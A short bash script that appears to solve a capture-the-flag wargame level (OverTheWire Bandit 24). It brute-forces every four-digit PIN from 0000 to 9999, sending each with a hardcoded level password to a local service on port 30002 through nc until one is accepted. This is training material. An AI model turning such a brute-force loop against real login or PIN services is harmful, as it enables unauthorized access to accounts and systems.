#!/bin/bash

for i in {0..9999}; do
    bandit24pass=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
#    padded_i=$(printf "%04d" $i)
    if [ ${#i} -eq 1 ]; then
        padded_i="000$i"
    elif [ ${#i} -eq 2 ]; then
        padded_i="00$i"
    elif [ ${#i} -eq 3 ]; then
        padded_i="0$i"
    else
        padded_i="$i"
    fi
    if echo $bandit24pass $padded_i | nc localhost 30002 | grep -q "Wrong"; then
        echo "$padded_i is not it!"
        continue
    else
        echo "gotcha!"
        echo $bandit24pass $padded_i | nc localhost 30002
        break
    fi
done
